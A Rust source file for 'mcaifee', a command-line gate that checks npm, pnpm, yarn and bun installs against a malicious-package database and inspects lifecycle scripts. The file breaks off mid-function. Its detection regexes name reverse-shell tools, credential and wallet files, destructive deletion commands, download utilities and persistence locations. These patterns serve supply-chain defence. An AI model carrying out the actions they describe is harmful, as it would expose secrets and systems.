use chrono::{DateTime, Duration, Utc};
use clap::{Parser, Subcommand, ValueEnum};
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::cmp::Reverse;
use std::collections::{HashMap, HashSet};
use std::env;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;
use url::Url;

const MCAIFEE_ASCII: &str = r#"
 __  __  ____    _    ___ _____ _____ _____
|  \/  |/ ___|  / \  |_ _|  ___| ____| ____|
| |\/| | |     / _ \  | || |_  |  _| |  _|
| |  | | |___ / ___ \ | ||  _| | |___| |___
|_|  |_|\____/_/   \_\___|_|   |_____|_____|
          npm / pnpm / yarn / bun gate
"#;

const SOURCE_DB_MAX_AGE_HOURS: i64 = 24;

#[derive(Parser, Debug)]
#[command(
    name = "mcaifee",
    about = "Wrap npm/pnpm/yarn/bun installs with a pre-install malware gate, or audit npm package specs and lockfiles directly."
)]
struct Args {
    #[arg(help = "npm package specs such as react@18.2.0 or @scope/pkg@1.0.0")]
    targets: Vec<String>,

    #[arg(long = "package-json", value_name = "PATH")]
    package_json: Option<PathBuf>,

    #[arg(long, value_name = "PATH")]
    lockfile: Option<PathBuf>,

    #[arg(long, help = "Use npm view for live registry metadata")]
    online: bool,

    #[arg(long, help = "Flag broad semver ranges in package.json")]
    strict_ranges: bool,

    #[arg(
        long = "allow-registry-host",
        default_value = "registry.npmjs.org",
        help = "Allowed registry hostname for resolved tarballs; repeat for private registries"
    )]
    allow_registry_host: Vec<String>,

    #[arg(long, value_enum, default_value_t = OutputFormat::Text)]
    format: OutputFormat,

    #[arg(
        long,
        value_enum,
        help = "Exit with status 2 when this severity or higher is found"
    )]
    fail_on: Option<Severity>,

    #[arg(
        long,
        default_value_t = 20,
        help = "Timeout in seconds for each npm view call"
    )]
    timeout: u64,
}

#[derive(Parser, Debug)]
struct ReportArgs {
    #[arg(help = "npm package specs such as react@18.2.0 or @scope/pkg@1.0.0")]
    targets: Vec<String>,

    #[arg(
        long = "package-json",
        value_name = "PATH",
        default_value = "package.json"
    )]
    package_json: PathBuf,

    #[arg(long, value_name = "PATH")]
    lockfile: Option<PathBuf>,

    #[arg(long, help = "Use npm view for live registry metadata")]
    online: bool,

    #[arg(long, value_enum, default_value_t = OutputFormat::Text)]
    format: OutputFormat,

    #[arg(long, help = "Include notes about the Docker paranoia simulation")]
    paranoia: bool,

    #[arg(
        long = "allow-registry-host",
        default_value = "registry.npmjs.org",
        help = "Allowed registry hostname for resolved tarballs; repeat for private registries"
    )]
    allow_registry_host: Vec<String>,

    #[arg(
        long,
        default_value_t = 20,
        help = "Timeout in seconds for each npm view call"
    )]
    timeout: u64,
}

#[derive(Parser, Debug)]
struct DbArgs {
    #[command(subcommand)]
    command: DbCommand,
}

#[derive(Subcommand, Debug)]
enum DbCommand {
    Update(DbUpdateArgs),
    Status(DbStatusArgs),
}

#[derive(Parser, Debug)]
struct DbUpdateArgs {
    #[arg(long, value_name = "PATH")]
    source: Option<PathBuf>,

    #[arg(long, value_name = "PATH")]
    db: Option<PathBuf>,

    #[arg(
        long,
        default_value = "https://github.com/ossf/malicious-packages",
        help = "Git repository to clone when --source is not provided"
    )]
    repo: String,

    #[arg(
        long,
        default_value = "OpenSSF malicious-packages",
        help = "Source name stored in imported records"
    )]
    source_name: String,
}

#[derive(Parser, Debug)]
struct DbStatusArgs {
    #[arg(long, value_name = "PATH")]
    db: Option<PathBuf>,
}

#[derive(Parser, Debug)]
struct ShellInitArgs {
    #[arg(long, value_enum, default_value_t = ShellKind::Posix)]
    shell: ShellKind,
}

#[derive(Parser, Debug)]
struct ShellDisableArgs {
    #[arg(long, value_enum, default_value_t = ShellKind::Posix)]
    shell: ShellKind,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq, ValueEnum)]
enum ShellKind {
    Posix,
    Bash,
    Zsh,
    Fish,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq, ValueEnum)]
enum OutputFormat {
    Text,
    Json,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize, ValueEnum)]
#[serde(rename_all = "lowercase")]
enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    fn score(self) -> u8 {
        match self {
            Severity::Info => 0,
            Severity::Low => 1,
            Severity::Medium => 2,
            Severity::High => 3,
            Severity::Critical => 4,
        }
    }

    fn as_str(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct JsonOutput {
    tool: &'static str,
    scope: Vec<String>,
    highest_risk: String,
    findings: Vec<Finding>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ReportOutput {
    tool: &'static str,
    mode: &'static str,
    scope: Vec<String>,
    highest_risk: String,
    summary: HashMap<String, usize>,
    package_json: Option<ManifestSummary>,
    lockfiles: Vec<LockfileSummary>,
    package_specs: Vec<String>,
    findings: Vec<Finding>,
    sources: Vec<SourceSummary>,
    recommended_next_steps: Vec<String>,
    paranoia: Option<ParanoiaSummary>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ManifestSummary {
    path: String,
    name: Option<String>,
    version: Option<String>,
    dependency_counts: HashMap<String, usize>,
    lifecycle_scripts: Vec<String>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct LockfileSummary {
    path: String,
    exists: bool,
    package_count: usize,
    install_script_count: usize,
    non_registry_sources: usize,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct SourceSummary {
    name: &'static str,
    category: &'static str,
    status: &'static str,
    url: &'static str,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ParanoiaSummary {
    enabled: bool,
    image: String,
    network: String,
    note: String,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
struct SourceDb {
    schema_version: u32,
    updated_at: String,
    records: Vec<SourceDbRecord>,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
struct SourceDbRecord {
    source: String,
    source_url: String,
    advisory_id: String,
    package: String,
    ecosystem: String,
    versions: Vec<String>,
    severity: String,
    confidence: String,
    summary: String,
    aliases: Vec<String>,
}

#[derive(Clone, Debug, Serialize)]
struct Finding {
    severity: Severity,
    target: String,
    code: String,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    evidence: Option<String>,
}

impl Finding {
    fn new(
        severity: Severity,
        target: impl Into<String>,
        code: impl Into<String>,
        message: impl Into<String>,
        evidence: Option<String>,
    ) -> Self {
        Self {
            severity,
            target: target.into(),
            code: code.into(),
            message: message.into(),
            evidence,
        }
    }
}

#[derive(Clone)]
struct ScriptPattern {
    code: &'static str,
    severity: Severity,
    regex: Regex,
    message: &'static str,
}

fn node_core_modules() -> &'static HashSet<&'static str> {
    static SET: OnceLock<HashSet<&'static str>> = OnceLock::new();
    SET.get_or_init(|| {
        [
            "_http_agent",
            "_http_client",
            "_http_common",
            "_http_incoming",
            "_http_outgoing",
            "_http_server",
            "_stream_duplex",
            "_stream_passthrough",
            "_stream_readable",
            "_stream_transform",
            "_stream_writable",
            "_tls_common",
            "_tls_wrap",
            "assert",
            "async_hooks",
            "buffer",
            "child_process",
            "cluster",
            "console",
            "constants",
            "crypto",
            "dgram",
            "diagnostics_channel",
            "dns",
            "domain",
            "events",
            "fs",
            "http",
            "http2",
            "https",
            "inspector",
            "module",
            "net",
            "os",
            "path",
            "perf_hooks",
            "process",
            "punycode",
            "querystring",
            "readline",
            "repl",
            "stream",
            "string_decoder",
            "sys",
            "timers",
            "tls",
            "trace_events",
            "tty",
            "url",
            "util",
            "v8",
            "vm",
            "worker_threads",
            "zlib",
        ]
        .into_iter()
        .collect()
    })
}

fn popular_packages() -> &'static HashSet<&'static str> {
    static SET: OnceLock<HashSet<&'static str>> = OnceLock::new();
    SET.get_or_init(|| {
        [
            "@angular/core",
            "@babel/core",
            "@vitejs/plugin-react",
            "axios",
            "chalk",
            "commander",
            "cors",
            "debug",
            "dotenv",
            "eslint",
            "express",
            "jest",
            "lodash",
            "minimist",
            "mocha",
            "moment",
            "next",
            "prettier",
            "react",
            "react-dom",
            "rollup",
            "semver",
            "tailwindcss",
            "typescript",
            "vite",
            "vue",
            "webpack",
            "yargs",
        ]
        .into_iter()
        .collect()
    })
}

fn suspicious_script_patterns() -> &'static Vec<ScriptPattern> {
    static PATTERNS: OnceLock<Vec<ScriptPattern>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        vec![
            ScriptPattern {
                code: "credential_access",
                severity: Severity::High,
                regex: Regex::new(r"(?i)(\.npmrc|npm_token|node_auth_token|github_token|gh_token|aws_access_key|aws_secret|google_application_credentials|ssh_auth_sock|\.ssh|id_rsa|wallet|mnemonic|keystore)").unwrap(),
                message: "references credential or secret material",
            },
            ScriptPattern {
                code: "reverse_shell",
                severity: Severity::Critical,
                regex: Regex::new(r"(?i)(\bnc\b|\bnetcat\b|\bncat\b|\bsocat\b|/dev/tcp/)").unwrap(),
                message: "contains reverse-shell tooling or socket shell primitives",
            },
            ScriptPattern {
                code: "destructive_command",
                severity: Severity::Critical,
                regex: Regex::new(r"(?i)(rm\s+-rf\s+(/|~|\$HOME)|del\s+/[sq]|format\s+[a-z]:)").unwrap(),
                message: "contains destructive filesystem command",
            },
            ScriptPattern {
                code: "network_download",
                severity: Severity::Medium,
                regex: Regex::new(r"(?i)(\bcurl\b|\bwget\b|invoke-webrequest|\biwr\b|\bfetch\s*\(|\bcertutil\b|\bbitsadmin\b)").unwrap(),
                message: "downloads content during lifecycle execution",
            },
            ScriptPattern {
                code: "encoded_payload",
                severity: Severity::High,
                regex: Regex::new(r"(?i)(base64\s+(-d|--decode)|atob\s*\(|fromcharcode|buffer\.from\s*\([^)]*base64)").unwrap(),
                message: "uses encoded payload construction",
            },
            ScriptPattern {
                code: "inline_interpreter",
                severity: Severity::Medium,
                regex: Regex::new(r"(?i)(\beval\b|function\s*\(|node\s+-e|python\s+-c|perl\s+-e|ruby\s+-e|\bpowershell\b|\bpwsh\b|\bbash\s+-c|\bsh\s+-c)").unwrap(),
                message: "runs inline code through an interpreter",
            },
            ScriptPattern {
                code: "startup_persistence",
                severity: Severity::High,
                regex: Regex::new(r"(?i)(crontab|launchagents|launchdaemons|systemd|startup|autorun|currentversion\\run)").unwrap(),
                message: "references persistence or startup locations",
            },
        ]
    })
}

fn main() {
    let raw_args = env::args().skip(1).collect::<Vec<_>>();
    let status =
        if let Some((package_manager, package_manager_args)) = split_wrapper_args(&raw_args) {
            run_package_manager_wrapper(package_manager, package_manager_args)
        } else if raw_args.first().is_some_and(|arg| arg == "shell-init") {
            let mut shell_args = vec!["mcaifee shell-init".to_string()];
            shell_args.extend(raw_args.into_iter().skip(1));
            run_shell_init(ShellInitArgs::parse_from(shell_args))
        } else if raw_args.first().is_some_and(|arg| arg == "shell-disable") {
            let mut shell_args = vec!["mcaifee shell-disable".to_string()];
            shell_args.extend(raw_args.into_iter().skip(1));
            run_shell_disable(ShellDisableArgs::parse_from(shell_args))
        } else if raw_args.first().is_some_and(|arg| arg == "shell-status") {
            run_shell_status()
        } else if raw_args.first().is_some_and(|arg| arg == "db") {
            let mut db_args = vec!["mcaifee db".to_string()];
            db_args.extend(raw_args.into_iter().skip(1));
            run_db(DbArgs::parse_from(db_args))
        } else if raw_args
            .first()
            .is_some_and(|arg| arg == "report" || arg == "audit")
        {
            let mut report_args = vec!["mcaifee report".to_string()];
            report_args.extend(raw_args.into_iter().skip(1));
            run_report(ReportArgs::parse_from(report_args))
        } else {
            let args = if raw_args.first().is_some_and(|arg| arg == "scan") {
                let mut scan_args = vec!["mcaifee".to_string()];
                scan_args.extend(raw_args.into_iter().skip(1));
                Args::parse_from(scan_args)
            } else {
                Args::parse()
            };
            run(args)
        };
    std::process::exit(status);
}

fn split_wrapper_args(raw_args: &[String]) -> Option<(&str, &[String])> {
    let package_manager = raw_args.first()?.as_str();
    if matches!(package_manager, "npm" | "pnpm" | "yarn" | "bun") {
        Some((package_manager, &raw_args[1..]))
    } else {
        None
    }
}

fn run_shell_init(args: ShellInitArgs) -> i32 {
    println!("{}", shell_init_script(args.shell));
    0
}

fn run_shell_disable(args: ShellDisableArgs) -> i32 {
    println!("{}", shell_disable_script(args.shell));
    0
}

fn run_shell_status() -> i32 {
    println!("mcaifee shell status");
    let active = env::var_os("MCAIFEE_SHELL_ACTIVE").is_some();
    println!("{}", if active { "active" } else { "not active" });
    0
}

fn shell_init_script(shell: ShellKind) -> &'static str {
    match shell {
        ShellKind::Posix | ShellKind::Bash | ShellKind::Zsh => {
            r#"export MCAIFEE_SHELL_ACTIVE=1
npm() { MCAIFEE_SHELL_NPM=1 command mcaifee npm "$@"; }
pnpm() { MCAIFEE_SHELL_PNPM=1 command mcaifee pnpm "$@"; }
yarn() { MCAIFEE_SHELL_YARN=1 command mcaifee yarn "$@"; }
bun() { MCAIFEE_SHELL_BUN=1 command mcaifee bun "$@"; }
"#
        }
        ShellKind::Fish => {
            r#"set -gx MCAIFEE_SHELL_ACTIVE 1
function npm
    env MCAIFEE_SHELL_NPM=1 command mcaifee npm $argv
end
function pnpm
    env MCAIFEE_SHELL_PNPM=1 command mcaifee pnpm $argv
end
function yarn
    env MCAIFEE_SHELL_YARN=1 command mcaifee yarn $argv
end
function bun
    env MCAIFEE_SHELL_BUN=1 command mcaifee bun $argv
end
"#
        }
    }
}

fn shell_disable_script(shell: ShellKind) -> &'static str {
    match shell {
        ShellKind::Posix | ShellKind::Bash | ShellKind::Zsh => {
            r#"unset -f npm 2>/dev/null || true
unset -f pnpm 2>/dev/null || true
unset -f yarn 2>/dev/null || true
unset -f bun 2>/dev/null || true
unset MCAIFEE_SHELL_ACTIVE MCAIFEE_SHELL_NPM MCAIFEE_SHELL_PNPM MCAIFEE_SHELL_YARN MCAIFEE_SHELL_BUN
"#
        }
        ShellKind::Fish => {
            r#"functions -e npm 2>/dev/null
functions -e pnpm 2>/dev/null
functions -e yarn 2>/dev/null
functions -e bun 2>/dev/null
set -e MCAIFEE_SHELL_ACTIVE
set -e MCAIFEE_SHELL_NPM
set -e MCAIFEE_SHELL_PNPM
set -e MCAIFEE_SHELL_YARN
set -e MCAIFEE_SHELL_BUN
"#
        }
    }
}

fn print_ascii_banner() {
    println!("{MCAIFEE_ASCII}");
}

fn run_db(args: DbArgs) -> i32 {
    match args.command {
        DbCommand::Update(update_args) => run_db_update(update_args),
        DbCommand::Status(status_args) => run_db_status(status_args),
    }
}

fn run_db_update(args: DbUpdateArgs) -> i32 {
    let db_path = args.db.unwrap_or_else(default_source_db_path);
    let source_path = if let Some(source) = args.source {
        source
    } else {
        let checkout = default_source_checkout_dir("openssf-malicious-packages");
        if let Err(error) = ensure_source_repo_checkout(&args.repo, &checkout) {
            eprintln!("mcaifee: source checkout failed: {error}");
            return 1;
        }
        checkout
    };

    let records = match import_osv_source_records(&source_path, &args.source_name) {
        Ok(records) => records,
        Err(error) => {
            eprintln!("mcaifee: source import failed: {error}");
            return 1;
        }
    };
    let db = SourceDb {
        schema_version: 1,
        updated_at: Utc::now().to_rfc3339(),
        records,
    };
    if let Some(parent) = db_path.parent() {
        if let Err(error) = fs::create_dir_all(parent) {
            eprintln!("mcaifee: could not create {}: {error}", parent.display());
            return 1;
        }
    }
    let encoded = match serde_json::to_vec_pretty(&db) {
        Ok(encoded) => encoded,
        Err(error) => {
            eprintln!("mcaifee: could not serialize source database: {error}");
            return 1;
        }
    };
    if let Err(error) = fs::write(&db_path, encoded) {
        eprintln!("mcaifee: could not write {}: {error}", db_path.display());
        return 1;
    }
    println!("mcaifee db update");
    println!("source: {}", source_path.display());
    println!("database: {}", db_path.display());
    println!("records: {}", db.records.len());
    0
}

fn run_db_status(args: DbStatusArgs) -> i32 {
    let db_path = args.db.unwrap_or_else(default_source_db_path);
    println!("mcaifee db status");
    println!("database: {}", db_path.display());
    match load_source_db(&db_path) {
        Ok(db) => {
            println!("exists: true");
            println!("schemaVersion: {}", db.schema_version);
            println!("updatedAt: {}", db.updated_at);
            println!("records: {}", db.records.len());
            0
        }
        Err(error) if error.kind() == io::ErrorKind::NotFound => {
            println!("exists: false");
            0
        }
        Err(error) => {
            eprintln!("mcaifee: could not read source database: {error}");
            1
        }
    }
}

fn auto_update_source_db_if_stale() {
    if env::var("MCAIFEE_DB_AUTO_UPDATE")
        .map(|value| {
            matches!(
                value.as_str(),
                "0" | "false" | "False" | "FALSE" | "no" | "NO"
            )
        })
        .unwrap_or(false)
    {
        return;
    }
    let db_path = default_source_db_path();
    if !source_db_needs_update(&db_path, Duration::hours(SOURCE_DB_MAX_AGE_HOURS)) {
        return;
    }
    eprintln!(
        "mcaifee: source database missing or older than {SOURCE_DB_MAX_AGE_HOURS}h; running db update"
    );
    let status = run_db_update(DbUpdateArgs {
        source: None,
        db: Some(db_path),
        repo: "https://github.com/ossf/malicious-packages".to_string(),
        source_name: "OpenSSF malicious-packages".to_string(),
    });
    if status != 0 {
        eprintln!("mcaifee: source database auto-update failed; continuing with local checks");
    }
}

fn source_db_needs_update(path: &Path, max_age: Duration) -> bool {
    let Ok(db) = load_source_db(path) else {
        return true;
    };
    let Ok(updated_at) = DateTime::parse_from_rfc3339(&db.updated_at) else {
        return true;
    };
    Utc::now() - updated_at.with_timezone(&Utc) > max_age
}

fn run_package_manager_wrapper(package_manager: &str, package_manager_args: &[String]) -> i32 {
    let (wrapper_options, package_manager_args) = parse_wrapper_options(package_manager_args);

    if env::var_os("MCAIFEE_BYPASS").is_some() {
        print_ascii_banner();
        eprintln!("mcaifee: bypass env is set; forwarding to {package_manager} without a gate");
        return run_external_command(package_manager, &package_manager_args);
    }

    if !should_gate_package_manager_command(package_manager, &package_manager_args) {
        return run_external_command(package_manager, &package_manager_args);
    }

    print_ascii_banner();
    auto_update_source_db_if_stale();
    println!(
        "mcaifee: gating `{}` before lifecycle scripts can run",
        format_command(package_manager, &package_manager_args)
    );

    let threshold = wrapper_options
        .fail_on
        .unwrap_or_else(wrapper_fail_threshold);
    let gate_result = if package_manager == "npm" {
        gate_npm_command(&package_manager_args, threshold, &wrapper_options)
    } else {
        gate_generic_package_manager_command(
            package_manager,
            &package_manager_args,
            threshold,
            &wrapper_options,
        )
    };

    match gate_result {
        Ok(()) => {
            println!("mcaifee: gate passed; running {package_manager}");
            run_external_command(package_manager, &package_manager_args)
        }
        Err(code) => code,
    }
}

#[derive(Debug, Default)]
struct WrapperOptions {
    paranoia: bool,
    fail_on: Option<Severity>,
}

fn parse_wrapper_options(package_manager_args: &[String]) -> (WrapperOptions, Vec<String>) {
    let mut options = WrapperOptions::default();
    let mut forwarded = Vec::new();
    let mut index = 0;
    while index < package_manager_args.len() {
        let arg = &package_manager_args[index];
        if arg == "--paranoia" || arg == "--mcaifee-paranoia" {
            options.paranoia = true;
        } else if let Some(value) = arg.strip_prefix("--mcaifee-fail-on=") {
            options.fail_on = parse_severity(value);
        } else if arg == "--mcaifee-fail-on" {
            if let Some(value) = package_manager_args.get(index + 1) {
                options.fail_on = parse_severity(value);
                index += 1;
            }
        } else {
            forwarded.push(arg.clone());
        }
        index += 1;
    }
    if env::var_os("MCAIFEE_PARANOIA").is_some() {
        options.paranoia = true;
    }
    (options, forwarded)
}

fn should_gate_package_manager_command(
    package_manager: &str,
    package_manager_args: &[String],
) -> bool {
    let Some(command) = first_command_arg(package_manager_args) else {
        return package_manager == "yarn";
    };
    match package_manager {
        "npm" => matches!(command, "install" | "i" | "add" | "ci" | "update" | "up"),
        "pnpm" => matches!(command, "install" | "i" | "add" | "update" | "up"),
        "yarn" => matches!(command, "install" | "add" | "upgrade" | "up"),
        "bun" => matches!(command, "install" | "i" | "add" | "update" | "up"),
        _ => false,
    }
}

fn first_command_arg(package_manager_args: &[String]) -> Option<&str> {
    find_command_index(package_manager_args).map(|index| package_manager_args[index].as_str())
}

fn find_command_index(package_manager_args: &[String]) -> Option<usize> {
    let mut skip_next = false;
    for (index, arg) in package_manager_args.iter().enumerate() {
        if skip_next {
            skip_next = false;
            continue;
        }
        if arg == "--" {
            continue;
        }
        if option_takes_value(arg) {
            skip_next = !arg.contains('=');
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        return Some(index);
    }
    None
}

fn wrapper_fail_threshold() -> Severity {
    env::var("MCAIFEE_FAIL_ON")
        .ok()
        .and_then(|value| parse_severity(&value))
        .unwrap_or(Severity::Medium)
}

fn parse_severity(value: &str) -> Option<Severity> {
    match value.to_lowercase().as_str() {
        "info" => Some(Severity::Info),
        "low" => Some(Severity::Low),
        "medium" => Some(Severity::Medium),
        "high" => Some(Severity::High),
        "critical" => Some(Severity::Critical),
        _ => None,
    }
}

fn gate_npm_command(
    package_manager_args: &[String],
    threshold: Severity,
    wrapper_options: &WrapperOptions,
) -> Result<(), i32> {
    let snapshots = match snapshot_project_files() {
        Ok(snapshots) => snapshots,
        Err(error) => {
            eprintln!("mcaifee: could not snapshot project files before npm staging: {error}");
            return Err(1);
        }
    };

    if should_stage_npm_lockfile(package_manager_args) {
        let staging_args = npm_staging_args(package_manager_args);
        println!(
            "mcaifee: staging npm lockfile with scripts disabled: {}",
            format_command("npm", &staging_args)
        );
        let staging_status = run_npm_internal_command(&staging_args);
        if staging_status != 0 {
            restore_project_files(&snapshots);
            eprintln!("mcaifee: npm staging failed; original npm command was not run");
            return Err(staging_status);
        }
    }

    let findings = collect_project_and_spec_findings("npm", package_manager_args, true);
    print_gate_findings(&findings);
    if has_threshold_findings(&findings, threshold) {
        restore_project_files(&snapshots);
        eprintln!(
            "mcaifee: blocked npm command because findings met threshold `{}`",
            threshold.as_str()
        );
        return Err(2);
    }

    if wrapper_options.paranoia {
        if let Err(code) = run_paranoia_docker_gate("npm", package_manager_args) {
            restore_project_files(&snapshots);
            return Err(code);
        }
    }

    Ok(())
}

fn gate_generic_package_manager_command(
    package_manager: &str,
    package_manager_args: &[String],
    threshold: Severity,
    wrapper_options: &WrapperOptions,
) -> Result<(), i32> {
    let findings = collect_project_and_spec_findings(package_manager, package_manager_args, true);
    print_gate_findings(&findings);
    if has_threshold_findings(&findings, threshold) {
        eprintln!(
            "mcaifee: blocked {package_manager} command because findings met threshold `{}`",
            threshold.as_str()
        );
        return Err(2);
    }
    if wrapper_options.paranoia {
        return run_paranoia_docker_gate(package_manager, package_manager_args);
    }
    Ok(())
}

fn should_stage_npm_lockfile(package_manager_args: &[String]) -> bool {
    first_command_arg(package_manager_args)
        .is_some_and(|command| matches!(command, "install" | "i" | "add" | "update" | "up"))
}

fn npm_staging_args(package_manager_args: &[String]) -> Vec<String> {
    let mut args = package_manager_args.to_vec();
    push_flag_if_missing(&mut args, "--package-lock-only");
    push_flag_if_missing(&mut args, "--ignore-scripts");
    push_flag_if_missing(&mut args, "--fund=false");
    push_flag_if_missing(&mut args, "--audit=false");
    args
}

fn push_flag_if_missing(args: &mut Vec<String>, flag: &str) {
    let flag_name = flag.split('=').next().unwrap_or(flag);
    if !args
        .iter()
        .any(|arg| arg == flag_name || arg.starts_with(&format!("{flag_name}=")))
    {
        args.push(flag.to_string());
    }
}

#[derive(Debug)]
struct FileSnapshot {
    path: PathBuf,
    contents: Option<Vec<u8>>,
}

fn snapshot_project_files() -> io::Result<Vec<FileSnapshot>> {
    ["package.json", "package-lock.json", "npm-shrinkwrap.json"]
        .into_iter()
        .map(|path| {
            let path = PathBuf::from(path);
            let contents = if path.exists() {
                Some(fs::read(&path)?)
            } else {
                None
            };
            Ok(FileSnapshot { path, contents })
        })
        .collect()
}

fn restore_project_files(snapshots: &[FileSnapshot]) {
    for snapshot in snapshots {
        let result = match &snapshot.contents {
            Some(contents) => fs::write(&snapshot.path, contents),
            None if snapshot.path.exists() => fs::remove_file(&snapshot.path),
            None => Ok(()),
        };
        if let Err(error) = result {
            eprintln!(
                "mcaifee: failed to restore {} after blocked command: {error}",
                snapshot.path.display()
            );
        }
    }
}

fn collect_project_and_spec_findings(
    package_manager: &str,
    package_manager_args: &[String],
    use_online_registry_metadata: bool,
) -> Vec<Finding> {
    let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
    let source_db = load_default_source_db();
    let mut findings = Vec::new();

    let package_json = PathBuf::from("package.json");
    if package_json.exists() {
        analyze_package_json(&package_json, &mut findings, false, source_db.as_ref());
    }

    for lockfile in lockfiles_for_package_manager(package_manager) {
        if lockfile.exists() {
            analyze_lockfile(&lockfile, &mut findings, &allowed_hosts, source_db.as_ref());
        }
    }

    for spec in extract_package_specs(package_manager, package_manager_args) {
        let name = package_name_from_spec(&spec);
        add_source_db_findings(
            source_db.as_ref(),
            &name,
            exact_version_from_spec(&spec).as_deref(),
            &spec,
            &mut findings,
        );
        if use_online_registry_metadata && !is_non_registry_spec(&spec) {
            analyze_online_spec(&spec, &mut findings, &allowed_hosts, 20);
        } else {
            analyze_package_name(&name, &mut findings, &spec);
            if is_non_registry_spec(&spec) {
                add_finding(
                    &mut findings,
                    if spec.to_lowercase().starts_with("http:") {
                        Severity::Critical
                    } else {
                        Severity::High
                    },
                    &spec,
                    "non_registry_spec",
                    "Package spec bypasses normal npm registry resolution.",
                    None,
                );
            }
        }
    }

    findings
}

fn lockfiles_for_package_manager(package_manager: &str) -> Vec<PathBuf> {
    match package_manager {
        "npm" => vec![
            PathBuf::from("npm-shrinkwrap.json"),
            PathBuf::from("package-lock.json"),
        ],
        "pnpm" => vec![PathBuf::from("pnpm-lock.yaml")],
        "yarn" => vec![PathBuf::from("yarn.lock")],
        "bun" => vec![PathBuf::from("bun.lock"), PathBuf::from("bun.lockb")],
        _ => Vec::new(),
    }
}

fn extract_package_specs(package_manager: &str, package_manager_args: &[String]) -> Vec<String> {
    let Some(command_index) = find_command_index(package_manager_args) else {
        return Vec::new();
    };
    let command = package_manager_args[command_index].as_str();
    let takes_package_specs = match package_manager {
        "npm" => matches!(command, "install" | "i" | "add" | "update" | "up"),
        "pnpm" => matches!(command, "add" | "update" | "up"),
        "yarn" => matches!(command, "add" | "upgrade" | "up"),
        "bun" => matches!(command, "add" | "update" | "up"),
        _ => false,
    };
    if !takes_package_specs {
        return Vec::new();
    }

    let mut specs = Vec::new();
    let mut skip_next = false;
    for arg in package_manager_args.iter().skip(command_index + 1) {
        if skip_next {
            skip_next = false;
            continue;
        }
        if arg == "--" {
            continue;
        }
        if option_takes_value(arg) {
            skip_next = !arg.contains('=');
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        specs.push(arg.to_string());
    }
    specs
}

fn option_takes_value(arg: &str) -> bool {
    matches!(
        arg,
        "--workspace"
            | "-w"
            | "--filter"
            | "-F"
            | "--prefix"
            | "--registry"
            | "--tag"
            | "--cwd"
            | "--cache"
            | "--userconfig"
            | "--global-folder"
            | "--modules-folder"
    ) || arg.starts_with("--workspace=")
        || arg.starts_with("--filter=")
        || arg.starts_with("--prefix=")
        || arg.starts_with("--registry=")
        || arg.starts_with("--tag=")
        || arg.starts_with("--cwd=")
        || arg.starts_with("--cache=")
        || arg.starts_with("--userconfig=")
        || arg.starts_with("--global-folder=")
        || arg.starts_with("--modules-folder=")
}

fn print_gate_findings(findings: &[Finding]) {
    println!(
        "{}",
        render_text(findings, &[String::from("package-manager-wrapper")])
    );
}

fn has_threshold_findings(findings: &[Finding], threshold: Severity) -> bool {
    findings
        .iter()
        .any(|finding| finding.severity.score() >= threshold.score())
}

fn run_external_command(program: &str, args: &[String]) -> i32 {
    match Command::new(program).args(args).status() {
        Ok(status) => status.code().unwrap_or(1),
        Err(error) => {
            eprintln!("mcaifee: failed to run `{program}`: {error}");
            127
        }
    }
}

fn run_npm_internal_command(args: &[String]) -> i32 {
    let mut command = Command::new("npm");
    command
        .args(args)
        .env("NPM_CONFIG_CACHE", mcaifee_npm_cache_dir())
        .env("npm_config_cache", mcaifee_npm_cache_dir());
    match command.status() {
        Ok(status) => status.code().unwrap_or(1),
        Err(error) => {
            eprintln!("mcaifee: failed to run internal `npm`: {error}");
            127
        }
    }
}

fn mcaifee_npm_cache_dir() -> PathBuf {
    let dir = env::temp_dir().join(format!("mcaifee-npm-cache-{}", std::process::id()));
    let _ = fs::create_dir_all(&dir);
    dir
}

fn default_cache_dir() -> PathBuf {
    if let Some(cache_home) = env::var_os("XDG_CACHE_HOME") {
        PathBuf::from(cache_home).join("mcaifee")
    } else if let Some(home) = env::var_os("HOME") {
        PathBuf::from(home).join(".cache").join("mcaifee")
    } else {
        env::temp_dir().join("mcaifee")
    }
}

fn default_source_db_path() -> PathBuf {
    env::var_os("MCAIFEE_DB_PATH")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_cache_dir().join("source-db.json"))
}

fn default_source_checkout_dir(name: &str) -> PathBuf {
    default_cache_dir().join("sources").join(name)
}

fn ensure_source_repo_checkout(repo: &str, checkout: &Path) -> io::Result<()> {
    if checkout.join(".git").exists() {
        let status = Command::new("git")
            .arg("-C")
            .arg(checkout)
            .args(["pull", "--ff-only"])
            .status()?;
        if status.success() {
            return Ok(());
        }
        return Err(io::Error::other(format!(
            "git pull failed for {}",
            checkout.display()
        )));
    }
    if let Some(parent) = checkout.parent() {
        fs::create_dir_all(parent)?;
    }
    let status = Command::new("git")
        .args(["clone", "--depth", "1", repo])
        .arg(checkout)
        .status()?;
    if status.success() {
        Ok(())
    } else {
        Err(io::Error::other(format!("git clone failed for {repo}")))
    }
}

fn load_default_source_db() -> Option<SourceDb> {
    load_source_db(&default_source_db_path()).ok()
}

fn load_source_db(path: &Path) -> io::Result<SourceDb> {
    let data = fs::read_to_string(path)?;
